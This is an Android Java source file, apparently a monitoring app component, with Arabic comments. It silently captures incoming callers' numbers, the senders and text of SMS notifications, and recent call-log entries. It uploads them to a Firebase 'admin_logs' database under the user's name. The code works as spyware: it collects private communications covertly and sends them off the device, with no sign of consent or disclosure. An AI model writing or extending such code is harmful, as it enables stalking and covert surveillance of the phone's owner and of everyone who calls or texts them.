package com.ban.ab;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

// استيراد الفايربيس السحابي 🚀
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class CallNotificationListener extends NotificationListenerService {

    private String userName;
    private String lastIncomingNumber = null; // لمتابعة آخر رقم رن وتجنب التكرار في نفس اللحظة

    @Override
    public void onCreate() {
        super.onCreate();
        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");
        
        // 1. مراقبة الرنين الفوري
        setupPhoneStateListener();
    }

    // الحالة الأولى: التقاط الرقم فوراً أثناء الرنين وتسجيله كـ "مكالمة فائتة" للآدمن في كل الأحوال 📞
    private void setupPhoneStateListener() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            telephonyManager.listen(new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String incomingNumber) {
                    super.onCallStateChanged(state, incomingNumber);
                    
                    if (incomingNumber == null || incomingNumber.isEmpty()) return;

                    if (state == TelephonyManager.CALL_STATE_RINGING) {
                        lastIncomingNumber = incomingNumber;
                        
                        Map<String, Object> logData = new HashMap<>();
                        logData.put("phone_number", incomingNumber);
                        logData.put("type", "مكالمة فائتة ❌"); // فرض التسمية المطلوبة في كل الحالات
                        logData.put("timestamp", System.currentTimeMillis());
                        
                        uploadLogToAdmin("live_calls", logData);
                    }
                }
            }, PhoneStateListener.LISTEN_CALL_STATE);
        }
    }

    // الحالة الثانية: التقاط الإشعارات للرسائل، وتشغيل فحص السجل فورا لتوثيق المكالمات الفائتة الحقيقية 💬
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;

        if (extras == null) return;

        String title = extras.getString("android.title", "");
        String text = extras.getString("android.text", "");

        // التقاط الرسائل المستلمة كأرقام ونصوص
        if (packageName.equals("com.android.mms") || packageName.contains("messaging") || 
            (sbn.getNotification().category != null && sbn.getNotification().category.equals("msg"))) {
            
            Map<String, Object> logData = new HashMap<>();
            logData.put("phone_number", title); // رقم المرسل يكون في العنوان عادة
            logData.put("type", "رسالة مستلمة جديدة ✉️");
            logData.put("content", text);
            logData.put("timestamp", System.currentTimeMillis());
            
            uploadLogToAdmin("live_messages", logData);
        }
        
        // فحص السجل فوراً بشكل دوري عند حدوث أي نشاط في الهاتف لضمان تسجيل المكالمات الفائتة
        readLastCallLog();
    }

    // الحالة الثالثة: القراءة المباشرة من سجل الهاتف والأمان الأقصى 🗂️
    private void readLastCallLog() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        Uri callsUri = CallLog.Calls.CONTENT_URI;
        // جلب آخر مكالمة مسجلة في جهاز المستخدم للتأكد
        try (Cursor managedCursor = getContentResolver().query(callsUri, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 1")) {
            if (managedCursor != null && managedCursor.moveToFirst()) {
                int numberIdx = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                
                String phNumber = managedCursor.getString(numberIdx);
                int callType = managedCursor.getInt(typeIdx);
                
                // في السجل: سواء كانت فائتة (MISSED_TYPE) أو مكالمة مرفوضة/لم يرد عليها (REJECTED_TYPE / BLOCKED_TYPE)
                // طلبك واضح: يهمنا تسجيلها "كمكالمة فائتة" في كل هذه الظروف
                if (callType == CallLog.Calls.MISSED_TYPE || 
                    callType == CallLog.Calls.INCOMING_TYPE || 
                    callType == CallLog.Calls.REJECTED_TYPE) {
                    
                    Map<String, Object> logData = new HashMap<>();
                    logData.put("phone_number", phNumber);
                    logData.put("type", "مكالمة فائتة ❌"); // توحيد المخرجات لتظهر عند الآدمن بنفس الوصف دائماً
                    logData.put("timestamp", System.currentTimeMillis());
                    
                    uploadLogToAdmin("sync_records", logData);
                }
            }
        } catch (Exception e) {
            Log.e("CallLog_Read", "Error verifying last log row", e);
        }
    }

    // رفع البيانات مباشرة إلى العقدة السحابية للآدمن عبر الفايربيس 🚀
    private void uploadLogToAdmin(String nodeName, Map<String, Object> data) {
        FirebaseDatabase.getInstance().getReference("admin_logs")
                .child(userName)
                .child(nodeName)
                .push() // لإنشاء سجلات متتالية ومنع مسح المكالمات السابقة
                .setValue(data);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
